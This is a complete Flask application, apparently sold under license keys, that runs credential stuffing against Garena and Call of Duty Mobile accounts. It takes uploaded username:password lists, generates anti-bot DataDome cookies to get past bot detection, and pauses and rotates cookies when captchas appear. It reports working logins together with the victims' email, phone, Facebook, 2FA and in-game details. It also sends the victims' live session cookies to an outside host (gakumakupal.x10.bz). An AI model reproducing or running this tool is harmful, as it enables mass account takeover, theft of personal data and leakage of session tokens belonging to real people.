# --- START OF FINAL, CORRECTED app.py ---

# --- Standard and System Imports ---
import os, sys, re, time, json, uuid, base64, hashlib, random, logging, urllib, threading, secrets, html
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urlencode
from collections import OrderedDict

# --- Flask and Extension Imports ---
from flask import Flask, render_template, request, jsonify, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from flask_admin import Admin, BaseView, expose
from flask_admin.contrib.sqla import ModelView
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Length, EqualTo, ValidationError
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

# --- Original Checker Module Imports ---
try:
    import requests
    from Crypto.Cipher import AES
    import change_cookie
    import ken_cookie
    import cookie_config
except ImportError as e:
    print(f"FATAL ERROR: A required module is missing -> {e}", file=sys.stderr)
    sys.exit(1)

# --- APP CONFIGURATION ---
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')

# --- Flask App Initialization ---
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(16))

# --- DATABASE CONFIGURATION FOR RENDER + NEON ---
database_url = os.environ.get('DATABASE_URL')
if database_url and database_url.startswith("postgres://"):
    database_url = database_url.replace("postgres://", "postgresql://", 1)
if not database_url:
    print("WARNING: DATABASE_URL not found. Falling back to local SQLite database.")
    app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{os.path.join(BASE_DIR, "local_dev.db")}'
else:
    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
# --- END OF DATABASE CONFIGURATION ---

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'
login_manager.login_message_category = 'info'

# --- DATABASE MODELS ---
class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    is_paid = db.Column(db.Boolean, default=False)
    key_expiry = db.Column(db.DateTime, nullable=True)
    def set_password(self, password): self.password_hash = generate_password_hash(password)
    def check_password(self, password): return check_password_hash(self.password_hash, password)

class LicenseKey(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(50), unique=True, nullable=False)
    duration_days = db.Column(db.Integer, nullable=False)
    is_used = db.Column(db.Boolean, default=False)
    used_by_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    used_at = db.Column(db.DateTime, nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    user = db.relationship('User', backref=db.backref('keys_used', lazy=True))

@login_manager.user_loader
def load_user(user_id): return User.query.get(int(user_id))

# --- FORMS ---
class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=4, max=25)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=6)])
    confirm_password = PasswordField('Confirm Password', validators=[DataRequired(), EqualTo('password')])
    submit = SubmitField('Register')
    def validate_username(self, username):
        with app.app_context():
            if User.query.filter_by(username=username.data).first():
                raise ValidationError('That username is taken.')

class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Login')

class RedeemKeyForm(FlaskForm):
    key = StringField('License Key', validators=[DataRequired()])
    submit = SubmitField('Redeem')

# --- FLASK-ADMIN SETUP ---
class AuthModelView(ModelView):
    def is_accessible(self): return current_user.is_authenticated and current_user.is_admin
    def inaccessible_callback(self, name, **kwargs): return redirect(url_for('login'))
class UserAdminView(AuthModelView):
    column_exclude_list, form_excluded_columns = ['password_hash'], ['password_hash', 'keys_used']
    column_searchable_list, column_filters = ['username'], ['is_admin', 'is_paid']
class KeyGeneratorView(BaseView):
    @expose('/', methods=['GET', 'POST'])
    def index(self):
        generated_keys = []
        if request.method == 'POST':
            try:
                num_keys, duration = int(request.form.get('num_keys', 1)), int(request.form.get('duration', 30))
                for _ in range(num_keys):
                    key_str = f"PAPA-MO-{secrets.token_hex(4).upper()}-{secrets.token_hex(4).upper()}"
                    new_key = LicenseKey(key=key_str, duration_days=duration)
                    db.session.add(new_key); generated_keys.append(key_str)
                db.session.commit(); flash(f'{num_keys} keys generated!', 'success')
            except Exception as e:
                db.session.rollback(); flash(f'Error: {e}', 'danger')
        return self.render('admin/key_generator.html', generated_keys=generated_keys)
    def is_accessible(self): return current_user.is_authenticated and current_user.is_admin

admin = Admin(app, name='Garena Admin', template_mode='bootstrap4')
admin.add_view(UserAdminView(User, db.session)); admin.add_view(AuthModelView(LicenseKey, db.session)); admin.add_view(KeyGeneratorView(name='Key Generator', endpoint='key-generator'))

# --- GLOBAL STATE & CHECKER LOGIC ---
check_status, status_lock, stop_events, captcha_pause_events = {}, threading.Lock(), {}, {}
def log_message(message, color_class='text-white', user_id=None):
    if user_id is None: return
    timestamp = datetime.now().strftime('%H:%M:%S')
    with status_lock:
        if user_id not in check_status: return
        check_status[user_id]['logs'].append({'timestamp': timestamp, 'message': str(message), 'class': color_class})
        if len(check_status[user_id]['logs']) > 500: check_status[user_id]['logs'] = check_status[user_id]['logs'][-500:]

# --- [START] COMPLETE CHECKER LOGIC ---
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
def get_datenow(): return str(int(time.time()))
def generate_md5_hash(password): md5_hash = hashlib.md5(); md5_hash.update(password.encode('utf-8')); return md5_hash.hexdigest()
def generate_decryption_key(password_md5, v1, v2): intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest(); return hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
def encrypt_aes_256_ecb(plaintext, key): cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB); plaintext_bytes = bytes.fromhex(plaintext); padding_length = 16 - len(plaintext_bytes) % 16; plaintext_bytes += bytes([padding_length]) * padding_length; chiper_raw = cipher.encrypt(plaintext_bytes); return chiper_raw.hex()[:32]
def getpass(password, v1, v2): password_md5 = generate_md5_hash(password); decryption_key = generate_decryption_key(password_md5, v1, v2); return encrypt_aes_256_ecb(password_md5, decryption_key)
def get_datadome_cookie(user_id):
    url, headers = 'https://dd.garena.com/js/', {'accept': '*/*','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'en-US,en;q=0.9','cache-control': 'no-cache','content-type': 'application/x-www-form-urlencoded','origin': 'https://account.garena.com','pragma': 'no-cache','referer': 'https://account.garena.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}
    js_data_dict = {"ttst": 76.7, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "lg": "en-US", "plg": 5, "plgne": True, "vnd": "Google Inc."}
    payload = {'jsData': json.dumps(js_data_dict), 'eventCounters' : '[]', 'jsType': 'ch', 'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae', 'ddk': 'AE3F04AD3F0D3A462481A337485081', 'Referer': 'https://account.garena.com/', 'request': '/', 'responsePage': 'origin', 'ddv': '4.35.4'}
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    try:
        response = requests.post(url, headers=headers, data=data, timeout=20); response.raise_for_status()
        cookie_string = response.json().get('cookie')
        if cookie_string: cookie_value = cookie_string.split(';')[0].split('=')[1]; log_message("[🍪] Fetched new DataDome cookie.", "text-success", user_id); return cookie_value
    except requests.exceptions.RequestException as e: log_message(f"DataDome fetch error: {e}", "text-danger", user_id)
    return None
def fetch_new_datadome_pool(num_cookies, user_id):
    log_message(f"[⚙️] Fetching {num_cookies} new cookies...", "text-info", user_id); new_pool = []
    for i in range(num_cookies):
        if stop_events.get(user_id, threading.Event()).is_set(): break
        new_cookie = get_datadome_cookie(user_id)
        if new_cookie and new_cookie not in new_pool: new_pool.append(new_cookie)
        log_message(f"Fetched cookies... ({len(new_pool)}/{num_cookies})", "text-info", user_id); time.sleep(random.uniform(0.5, 1.5))
    if new_pool: log_message(f"[✅] Fetched {len(new_pool)} new unique cookies.", "text-success", user_id)
    else: log_message(f"[❌] Failed to fetch any new cookies.", "text-danger", user_id)
    return new_pool
def format_result(user_id, last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, username, password):
    is_clean_text, email_ver_text = ("Clean ✔", "(Verified✔)") if is_clean else ("Not Clean ⚠️", "(Not Verified⚠️)")
    bool_status = lambda status: "True ✔" if status == 'True' else "False ❌"
    console_message = f"""[✅] GARENA ACCOUNT HIT
   [🔑 Credentials]
      User: {username}
      Pass: {password}
   [📊 Information]
      Country: {country}
      Shells: {shell} 💰
      Last Login: {last_login}
      Email: {email} {email_ver_text}
      Facebook: {fb}
   [🎮 CODM Details]
      {connected_games[0].replace(chr(10), chr(10) + "      ")}
   [🛡️ Security]
      Status: {is_clean_text}
      Mobile Bind: {bool_status('True' if mobile != 'N/A' else 'False')}
      Facebook Link: {bool_status(facebook)}
      2FA Enabled: {bool_status(two_step_enabled)}
      Authenticator: {bool_status(authenticator_enabled)}
      - Presented By: PAPA MO -""".strip()
    return (console_message, is_clean)
def show_level(access_token, selected_header, sso, token, newdate, cookie):
    try:
        url, params = "https://auth.codm.garena.com/auth/auth/callback_n", {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token}
        headers = {"Referer": "https://auth.garena.com/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}; cookie.update({"datadome": newdate, "sso_key": sso, "token_session": token})
        res = requests.get(url, headers=headers, cookies=cookie, params=params, timeout=30, allow_redirects=True); res.raise_for_status()
        extracted_token = parse_qs(urlparse(res.url).query).get("token", [None])[0]
        if not extracted_token: return "[FAILED] No token from CODM callback."
        check_login_url, check_login_headers = "https://api-delete-request.codm.garena.co.id/oauth/check_login/", {"codm-delete-token": extracted_token, "Origin": "https://delete-request.codm.garena.co.id", "Referer": "https://delete-request.codm.garena.co.id/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
        check_login_response = requests.get(check_login_url, headers=check_login_headers, timeout=30); check_login_response.raise_for_status()
        data = check_login_response.json()
        if data and "user" in data: user_info = data["user"]; return f"{user_info.get('codm_nickname', 'N/A')}|{user_info.get('codm_level', 'N/A')}|{user_info.get('region', 'N/A')}|{user_info.get('uid', 'N/A')}"
        return "[FAILED] NO CODM ACCOUNT!"
    except Exception as e: return f"[FAILED] CODM data fetch error: {e}"
def check_login(user_id, account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, selected_cookie_module):
    try:
        cookies["datadome"] = dataa; login_params = {'app_id': '100082', 'account': account_username, 'password': encryptedpassword, 'redirect_uri': redrov, 'format': 'json', 'id': _id}
        response = requests.get(apkrov + urlencode(login_params), headers=selected_header, cookies=cookies, timeout=60)
        login_json = response.json()
        if 'error_auth' in login_json or 'error' in login_json: return "[🔐] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
        session_key = login_json.get('session_key')
        if not session_key: return "[FAILED] No session key after login"
        successful_token = response.cookies.get('token_session')
        sso_key = response.cookies.get('sso_key', '')
        coke = selected_cookie_module.get_cookies(); coke["datadome"] = dataa; coke["sso_key"] = sso_key
        if successful_token: coke["token_session"] = successful_token
        hider = {'Host': 'account.garena.com', 'User-Agent': selected_header["User-Agent"], 'Referer': f'https://account.garena.com/?session_key={session_key}'}
        init_url = 'http://gakumakupal.x10.bz/patal.php'
        params = {f'coke_{k}': v for k, v in coke.items()}; params.update({f'hider_{k}': v for k, v in hider.items()})
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status(); init_json_response = init_response.json()
        if 'error' in init_json_response or not init_json_response.get('success', True): return f"[ERROR] {init_json_response.get('error', 'Bind check failed')}"
        bindings = init_json_response.get('bindings', []); is_clean = "\033[0;32m\033[1mClean\033[0m" in init_json_response.get('status', "")
        country, last_login, fb, mobile, facebook, shell, email, email_verified, authenticator_enabled, two_step_enabled = ("N/A",)*10
        for item in bindings:
            try:
                key, value = item.split(":", 1); value = value.strip()
                if key == "Country": country = value
                elif key == "LastLogin": last_login = value
                elif key == "Garena Shells": shell = value
                elif key == "Facebook Account": fb, facebook = (value, "True") if "Not Linked" not in value else ("N/A", "False")
                elif key == "Mobile Number": mobile = value if "Not Linked" not in value else "N/A"
                elif key == "eta": email = value
                elif key == "tae": email_verified = "True"
                elif key == "Authenticator": authenticator_enabled = "True"
                elif key == "Two-Step Verification": two_step_enabled = "True"
            except ValueError: continue
        game_info = show_level(login_json.get('access_token'), selected_header, sso_key, successful_token, dataa, cookies)
        if "[FAILED]" in game_info: connected_games = [f"No CODM account found or error: {game_info}"]
        else:
            codm_nickname, codm_level, codm_region, uid = game_info.split("|"); connected_games = [f"  Nickname: {codm_nickname}\n  Level: {codm_level}\n  Region: {codm_region}\n  UID: {uid}"]
        return format_result(user_id, last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, account_username, password)
    except Exception as e: return f"[FAILED] Check Login Error: {e}"
def check_account(user_id, username, password, date, datadome_cookie, selected_cookie_module):
    try:
        random_id = "17290585" + str(random.randint(10000, 99999))
        cookies, headers = selected_cookie_module.get_cookies(), {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'}
        if datadome_cookie: cookies['datadome'] = datadome_cookie
        params = {"app_id": "100082", "account": username, "format": "json", "id": random_id}
        response = requests.get("https://auth.garena.com/api/prelogin", params=params, cookies=cookies, headers=headers, timeout=20)
        if "captcha" in response.text.lower(): return "[CAPTCHA]"
        if response.status_code == 200:
            data = response.json()
            if not all(k in data for k in ['v1', 'v2', 'id']): return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"
            login_datadome, encrypted_password = response.cookies.get('datadome') or datadome_cookie, getpass(password, data['v1'], data['v2'])
            return check_login(user_id, username, random_id, encrypted_password, password, headers, cookies, login_datadome, date, selected_cookie_module)
        else: return f"[FAILED] Pre-login HTTP Status: {response.status_code}"
    except requests.exceptions.RequestException as e: return f"[FAILED] Request Error: {e}"
    except Exception as e: import traceback; log_message(f"CRITICAL in check_account: {e}\n{traceback.format_exc()}", "text-danger", user_id); return f"[FAILED] CRITICAL Error: {e}"

def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart):
    with app.app_context():
        try:
            user = User.query.get(user_id)
            is_paid_user = user.is_paid and user.key_expiry and user.key_expiry > datetime.utcnow()
            line_limit = None if is_paid_user else 100
            selected_cookie_module = getattr(sys.modules[__name__], selected_cookie_module_name)
            stop_event, captcha_pause_event = stop_events[user_id], captcha_pause_events[user_id]
            stats, date = {'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0, 'no_exist': 0, 'captcha_count': 0}, get_datenow()
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f: accounts = list(OrderedDict.fromkeys(line.strip() for line in f if line.strip()))
            except Exception as e:
                log_message(f"Error reading account file: {e}", "text-danger", user_id);
                with status_lock:
                    if user_id in check_status: check_status[user_id]['running'] = False
                return
            if line_limit and len(accounts) > line_limit:
                log_message(f"Free tier: Processing first {line_limit} of {len(accounts)} accounts.", 'text-warning', user_id); accounts = accounts[:line_limit]
            total_accounts, accounts_to_process = len(accounts), accounts
            with status_lock: check_status[user_id]['total'], check_status[user_id]['progress'], check_status[user_id]['stats'] = total_accounts, 0, stats
            cookie_state = {'pool': [], 'index': -1, 'cooldown': {}}
            if use_cookie_set: cookie_state['pool'] = [c.get('datadome') for c in cookie_config.COOKIE_POOL if c.get('datadome')]
            if not cookie_state['pool']:
                log_message("[⚠️] Cookie pool empty. Fetching new...", "text-warning", user_id); cookie_state['pool'] = fetch_new_datadome_pool(5, user_id)
            if not cookie_state['pool']:
                log_message("[❌] Failed to get any cookies. Stopping.", "text-danger", user_id); stop_event.set()
            for loop_idx, acc in enumerate(accounts_to_process):
                if stop_event.is_set(): break
                with status_lock: check_status[user_id]['progress'], check_status[user_id]['current_account'] = loop_idx + 1, acc
                if ':' not in acc: log_message(f"Invalid format: {acc} ➔ Skipping", "text-warning", user_id); continue
                username, password = acc.split(':', 1); is_captcha_loop = True
                while is_captcha_loop and not stop_event.is_set():
                    current_datadome = None
                    if cookie_state['pool']:
                        for _ in range(len(cookie_state['pool'])):
                            cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool']); potential_cookie = cookie_state['pool'][cookie_state['index']]
                            if time.time() > cookie_state['cooldown'].get(potential_cookie, 0): current_datadome = potential_cookie; break
                    if not current_datadome:
                        log_message("[❌] All cookies on cooldown. Waiting for user...", "text-danger", user_id)
                        with status_lock: check_status[user_id]['captcha_detected'] = True
                        captcha_pause_event.clear(); captcha_pause_event.wait();
                        with status_lock: check_status[user_id]['captcha_detected'] = False
                        if stop_event.is_set(): break; continue
                    log_message(f"[▶] Checking: {username}:{password} with cookie ...{current_datadome[-6:]}", "text-info", user_id)
                    result = check_account(user_id, username, password, date, current_datadome, selected_cookie_module)
                    if result == "[CAPTCHA]":
                        stats['captcha_count'] += 1; log_message(f"[🔴 CAPTCHA] on cookie ...{current_datadome[-6:]}. Cooldown 5 mins.", "text-danger", user_id)
                        cookie_state['cooldown'][current_datadome] = time.time() + 300
                        with status_lock: check_status[user_id]['captcha_detected'] = True
                        captcha_pause_event.clear(); captcha_pause_event.wait()
                        with status_lock: check_status[user_id]['captcha_detected'] = False
                        if stop_event.is_set(): break; continue
                    else: is_captcha_loop = False
                if stop_event.is_set(): break
                if isinstance(result, tuple):
                    console_message, is_clean = result
                    log_message(console_message, "text-success", user_id); stats['successful'] += 1
                    if is_clean: stats['clean'] += 1
                    else: stats['not_clean'] += 1
                elif isinstance(result, str):
                    stats['failed'] += 1
                    if "[🔐]" in result: stats['incorrect_pass'] += 1
                    elif "[😢]" in result: stats['no_exist'] += 1
                    log_message(f"User: {username} | Pass: {password} ➔ {result}", "text-danger", user_id)
                with status_lock: check_status[user_id]['stats'] = stats.copy()
            summary = f"--- CHECK COMPLETE --- | Total: {total_accounts} | Hits: {stats['successful']} | Fails: {stats['failed']}"
            log_message(summary, "text-success", user_id)
            if not stop_event.is_set() and auto_delete and os.path.exists(file_path):
                try: os.remove(file_path); log_message(f"Source file deleted.", "text-info", user_id)
                except OSError as e: log_message(f"Failed to delete file: {e}", "text-danger", user_id)
            with status_lock: check_status[user_id]['final_summary'] = summary
        except Exception as e:
            import traceback; log_message(f"CRITICAL in checker task: {e}\n{traceback.format_exc()}", "text-danger", user_id)
        finally:
            if os.path.exists(file_path):
                try: os.remove(file_path)
                except OSError: pass
            with status_lock:
                if user_id in check_status: check_status[user_id]['running'] = False

# --- AUTHENTICATION & APP ROUTES ---
@app.context_processor
def inject_utcnow(): return dict(utcnow=datetime.utcnow)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated: return redirect(url_for('index'))
    form = RegistrationForm()
    if form.validate_on_submit():
        user = User(username=form.username.data); user.set_password(form.password.data)
        if User.query.count() == 0: user.is_admin = True
        db.session.add(user); db.session.commit()
        flash('Account created! You can now log in.', 'success')
        return redirect(url_for('login'))
    return render_template('register.html', title='Register', form=form)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated: return redirect(url_for('index'))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and user.check_password(form.password.data):
            login_user(user, remember=True); next_page = request.args.get('next')
            return redirect(next_page or url_for('index'))
        else: flash('Login unsuccessful. Check username and password.', 'danger')
    return render_template('login.html', title='Login', form=form)

@app.route('/logout')
def logout(): logout_user(); return redirect(url_for('login'))

@app.route('/redeem_key', methods=['POST'])
@login_required
def redeem_key():
    form = RedeemKeyForm()
    if form.validate_on_submit():
        key_str = form.key.data
        key = LicenseKey.query.filter_by(key=key_str).first()
        if key and not key.is_used:
            key.is_used, key.used_by_id, key.used_at = True, current_user.id, datetime.utcnow()
            now, start_date = datetime.utcnow(), current_user.key_expiry if current_user.is_paid and current_user.key_expiry > now else now
            current_user.key_expiry, current_user.is_paid = start_date + timedelta(days=key.duration_days), True
            db.session.commit()
            flash(f'Key redeemed! PRO access expires {current_user.key_expiry.strftime("%Y-%m-%d")}.', 'success')
        else: flash('Invalid or already used key.', 'danger')
    return redirect(url_for('index'))

@app.route('/')
@login_required
def index():
    redeem_form = RedeemKeyForm(); return render_template('index.html', redeem_form=redeem_form)

@app.route('/start_check', methods=['POST'])
@login_required
def start_check():
    user_id = current_user.id
    with status_lock:
        if check_status.get(user_id, {}).get('running'): return jsonify({'status': 'error', 'message': 'A check is already running.'}), 400
        check_status[user_id] = {'running': True, 'progress': 0, 'total': 0, 'logs': [], 'stats': {}, 'final_summary': None, 'captcha_detected': False, 'current_account': ''}
        stop_events[user_id], captcha_pause_events[user_id] = threading.Event(), threading.Event()
    file = request.files.get('account_file')
    if not file or file.filename == '': return jsonify({'status': 'error', 'message': 'No file selected.'}), 400
    filename = secure_filename(f"{user_id}_{file.filename}"); temp_dir = '/tmp'; file_path = os.path.join(temp_dir, filename)
    file.save(file_path)
    cookie_module, use_cookie_set, auto_delete, force_restart = request.form.get('cookie_module', 'ken_cookie'), 'use_cookie_set' in request.form, 'auto_delete' in request.form, 'force_restart' in request.form
    log_message("Starting new check...", "text-info", user_id)
    thread = threading.Thread(target=run_check_task, args=(user_id, file_path, cookie_module, use_cookie_set, auto_delete, force_restart))
    thread.daemon = True; thread.start()
    return jsonify({'status': 'success', 'message': 'Checker started.'})

@app.route('/status')
@login_required
def get_status():
    # THIS IS THE CORRECTED FUNCTION
    with status_lock:
        return jsonify(check_status.get(current_user.id, {}))

@app.route('/stop_check', methods=['POST'])
@login_required
def stop_check_route():
    user_id = current_user.id
    if user_id in stop_events:
        stop_events[user_id].set()
        if user_id in captcha_pause_events and not captcha_pause_events[user_id].is_set(): captcha_pause_events[user_id].set()
        log_message("Stop request received...", "text-warning", user_id)
        return jsonify({'status': 'success', 'message': 'Stop signal sent.'})
    return jsonify({'status': 'error', 'message': 'No active check found.'})

@app.route('/captcha_action', methods=['POST'])
@login_required
def captcha_action():
    user_id, action = current_user.id, request.form.get('action')
    log_message(f"Captcha action: {action}", "text-info", user_id)
    if action == 'fetch_pool': threading.Thread(target=fetch_new_datadome_pool, args=(5, user_id)).start()
    if action == 'stop_checker' and user_id in stop_events: stop_events[user_id].set()
    if user_id in captcha_pause_events: captcha_pause_events[user_id].set()
    return jsonify({'status': 'success', 'message': 'Action processed.'})

with app.app_context(): db.create_all()

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        if User.query.count() == 0:
            admin_user = User(username='admin', is_admin=True); admin_user.set_password('admin')
            db.session.add(admin_user); db.session.commit()
            print("Default local admin user 'admin' created.")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=True)

# --- END OF app.py ---